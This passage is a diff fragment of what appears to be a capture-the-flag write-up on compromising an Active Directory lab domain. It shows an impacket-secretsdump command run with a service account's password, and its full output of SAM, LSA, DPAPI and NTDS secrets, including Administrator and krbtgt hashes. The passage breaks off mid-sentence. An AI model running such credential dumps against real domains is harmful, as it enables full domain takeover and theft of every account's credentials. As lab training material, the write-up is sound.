@@ -462,3 +462,40 @@ Using kerberos authentication i see that the ldap_svc account is an administrato
 
 So ive got two options here i can either setup a realm and attempt to autheticate to winrm on the dc using `ldap_svc` or i can use `ldap_svc` access to perform a secretsdump and get the administrator hash then winrm that way!
 
+```python
+impacket-secretsdump ext.darkhaven.local/'ldap_svc':'6trfgvb**hs#@jskKFHJAh34'@dc.ext.darkhaven.local -k
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] Service RemoteRegistry is in stopped state
+[*] Starting service RemoteRegistry
+[*] Target system bootKey: 0x518057f001e4dca9dfdc66464040ef20
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:5f45531e2a05d63ee77bdfbb5b2e5530:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+DARKHAVEN\DC$:plain_password_hex:380036005400390069004b00350032004d0072005a005a00490071004b004d0042007a0058004f0069006e004d006e004e006d007300720074004b005200430035006e007a0049006a0051003d00500030003d0071005a0062003500680056004c0068004e00730046006c004e0055006500730042006f00590048002b0064004b0070007a006f0070006a0057006a0043006a004900750050007900310063007a00740062004e0050006b004b003400730057003400760077002b007900480049006d006b0069006d0079005900450073003600300049004300480072002b00730039004200330056004a005500700063007100510050007a004d0071004800510058007000370066004b006c006900490038003400500079006400340051004f0072002b0041006c0047006200330064005a0049003d00320046005200500073004d006d003400430053006c0070006d007a0053006f003d006b006a0057006a00680036006e00300070006b00540054007a00500079006b006800720061004a0069003300410044004b00750030006e0049003d004f00370039004d005a0032004e006600670078006e0056005a00550041005700590077007a004b00580065005a005a006400320045006f00750067007400530064004a0054005600420047002b004800350073004d0075006d00780067003d006300620055005a003700
+DARKHAVEN\DC$:aad3b435b51404eeaad3b435b51404ee:149f952298773d9914299765062cdca5:::
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0x7c133bb3e82017ef809376cf683ac20b909849fc
+dpapi_userkey:0xbafc69384c317fcffec3c7fe3d7a41e88fe14d1a
+[*] NL$KM 
+ 0000   D6 F9 1E BE 20 95 21 6A  88 22 1F 5C 92 CE 2C 8A   .... .!j.".\..,.
+ 0010   BB CF 2C 38 59 53 A4 3A  EF A0 03 DA EA A5 A8 CF   ..,8YS.:........
+ 0020   0E 6F 91 92 02 3E 5B 45  40 E2 C7 A8 D5 DA 8B 11   .o...>[E@.......
+ 0030   6D 77 6B 5F 3F 78 48 12  0F BF A8 CE 06 C2 C6 7C   mwk_?xH........|
+NL$KM:d6f91ebe2095216a88221f5c92ce2c8abbcf2c385953a43aefa003daeaa5a8cf0e6f9192023e5b4540e2c7a8d5da8b116d776b5f3f7848120fbfa8ce06c2c67c
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+[-] CCache file is not found. Skipping...
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:c093cbd6000fa289a92b412131a4cefa:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:70eed1cbbc6e2c26fc0ee22c17d3cde1:::
+
+...[SNIP]...
+```
+
+Ill use `ldap_svc` access as an administrator to dump
